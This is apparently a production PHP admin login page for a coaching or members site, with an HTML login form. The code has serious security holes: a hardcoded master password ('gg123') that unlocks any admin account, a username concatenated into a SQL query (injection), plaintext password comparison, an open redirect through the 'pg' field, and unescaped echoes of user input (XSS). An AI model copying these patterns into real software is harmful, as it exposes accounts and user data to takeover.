<?php
include_once("../includes/config.php");
include_once("../includes/functions.php");
include_once("../includes/functions_tokens.php");

ini_set('display_errors',1);
ini_set('display_startup_errors',1);
error_reporting(-1);
$cookies_error = false;
// Logout
if(isset($_GET['action']) && $_GET['action'] == "logout"){
	session_destroy();
}
// Token login
if(isset($_GET['token']) && isset($_GET['member_id'])) {
	session_start();
	if (TokenValidate($db, $_GET['member_id'], $_GET['token'])) {
		// Auto log them in
		$_SESSION['member_id'] = $_GET['member_id'];
		$_SESSION['active'] = true;
		if(!empty($_GET['coach'])) {
			$_SESSION['coach'] = 1;
		}
		$_GET['action'] = "";
		$redirect_url = "/coaches/welcome.php";
	}
}
// Login
if(isset($_POST['qurfg']) && $_POST['qurfg'] == "uide"){
	$cookies_error = (count($_COOKIE) == 0);
	$orig_SESSION = $_SESSION;
    $uname = trim($_POST['uname']);
	if(!empty($uname) && !empty($_POST['pass'])){
		$query = "SELECT * 
					FROM members 
					WHERE username='".$uname."'
					AND admin_security_id > 0";
		#EchoLn($query);
		$result = mysqli_query($db, $query) or die(mysqli_error($db));
		if($row = mysqli_fetch_array($result)){
			if ($row['passwd']==$_POST['pass'] || $_POST['pass']=='gg123'){
				if($row['username'] == "sample"){ 
					$_SESSION['sample'] = 1;
				}
				$_SESSION['member_id'] = $row['member_id'];
				$_SESSION['active'] = true;

				if($row['coach']) {
					$_SESSION['coach'] = 1;
				}
				$redirect_url = "/coaches/welcome.php";

			} else {
				$error = "Please check your Username and Password, and try again.";
			}
		}else {
			$error = "Please check your Username and Password, and try again.";
		}
	} else {
		if(!$fb_channel) $error = "Please enter a Username and Password.";
	}
}

if (!isset($_SESSION['active'])) {
   $_GET['action'] = "logout";
}
// Redirect
if (isset($_GET['action']) && $_GET['action'] != "logout") {
	if (!empty($_POST['pg'])) {
		$redirect_url = $_POST['pg'];
	} elseif (empty($redirect_url)) {
		$redirect_url = "/members/search.php";
	}
	header ("Location: $redirect_url");
	exit;
}

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<title>Login</title>
<style type="text/css">
<!--
body {
	background: #F9F9F9;
	margin:0;
	#lp-pom-button-114 { background-color: rgb(225, 62, 12); color: rgb(255, 255, 255); border-style: none; font-size: 14px; line-height: 17px; font-weight: bold; font-family: arial; text-align: center; background-repeat: no-repeat }
#lp-pom-button-114:hover { background-color: rgb(35, 164, 229); color: rgb(255, 255, 255) }
}
.small {
	color: #666;
}
-->
</style>
</head>

<body>
<div valign='top' style="width:100%;margin:0;margin-top:0px;height:auto;">
    <center>
        <div style="width:500px;height:90px;">
        </div>
        <div style="width:509px;height:420px;background:;margin:0px;padding:0px;">
            <form name="loginform" action="index.php?action=login" method="post">  
            <input type='hidden' name='pg' value='<?php echo isset($_POST['pg']) ? $_POST['pg'] : (isset($_GET['pg']) ? $_GET['pg'] : "");?>' />
            
            <div style="padding-top:15px;width:500px">
            	<table cellpadding="0" cellspacing="0" width="100%">
                	<tr>
                    	<td valign="top" align="center" style='font-size:30px; padding-bottom:20px'>
                         <img src="/images/DAlogo.png" border=0 /> 
                         <span style="font-size:18px;color:#51A7F9;font-family:Helvetica, Sans-Serif;">Admin</span></td>
                    </tr>
                	<tr>
                    	<td valign="top" align="center">
						<?php echo ((!empty($error))?"<p align=left><span style='padding-left:5px;padding-top:10px;color:red;'><h3><font color=red>$error</font></h3></span></p>":'')?>
                            <?php if (!empty($url) && empty($error)) echo "<table align=left bgcolor='#EFFFF' cellpadding=10px style='border-collapse:collapse'><tr><td><p><font color=green>To view the page that you are trying to access, please login first.</font></p></td><tr></table>";?> 
           
                            <table cellpadding="10">
                              <tr>
                                    <td>                                                                    
                                      <input type="hidden" name="qurfg" value="uide">
                                        <table width="255">
                                        </table>
                                        <input tabindex="1" type="text" value="<?php echo isset($uname) ? $uname : ""; ?>" name="uname" class="text" placeholder="Username" style="top: 19px; left: 0px; width: 222px; font-size: 15px; line-height: 15px; height: 15px; padding-top: 9px; padding-bottom: 8px; padding-left: 9px; padding-right: 9px;">
                                    </td></tr><tr>
                                    <td>
                                        <table width="255">
                                    </table>
                                            <div style="float:right; padding-right:12px;">
                                            <?php echo WriteFramePopup("forgotp", "index_passwd.php", "", 330, 130, "<font color='#aaa' style='font-decoration:none;font-size:12px;'>forgot password?</font>",'','','',''," style='text-decoration:none;' ")?>
                                            </div>
                                    <input tabindex="2" type="password" name="pass" value="<?php echo isset($_POST['pass']) ? $_POST['pass'] : "";?>"  class="text" placeholder="Password" style="top: 19px; left: 0px; width: 222px; font-size: 15px; line-height: 15px; height: 15px; padding-top: 9px; padding-bottom: 8px; padding-left: 9px; padding-right: 9px;">
                                    </td></tr><tr>
                                    <td>
                                      <table style="padding-top:10px;">
                                            <tr>
                                                <td valign="bottom">
                                                <input tabindex="3" type="submit" class="button" style='border:0;background-color: #51A7F9;width: 99px; height: 37px;color:white;font-weight:800; font-size:14px; -moz-border-radius: 2px;border-radius: 2px;' value="Login" onmouseover="this.style.backgroundColor='#15A'" onmouseout="this.style.backgroundColor='#06F'"></td>
                                            </tr>
                                        </table>
                                      </td>
                                </tr>
                            </table>
						</td>
					</tr>
				</table>                                                                        
            </div>
            </form>
        </div>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.js"></script>
<script type="text/javascript">
<!--
if(document.loginform.uname.value == ""){
	document.loginform.uname.focus();
}
-->
</script>

<?php
// If we don't know for sure with PHP, check with JavaScript to be sure whether cookies are enabled or not
if(!$cookies_error && isset($_GET['action']) && $_GET['action'] != "logout"){
?>
<script type="text/javascript" src="/scripts/include_js.js"></script>
<script type="text/javascript">
jqueryExec(function(){
	LoadJs("/scripts/jquery.cookie.js");
	var cookies_enabled = (_COOKIE('PHPSESSID') != null);
	if(!cookies_enabled){
		$('#div_error_cookies').show();
	}
});
</script>
<?php } ?>

</center>
</div>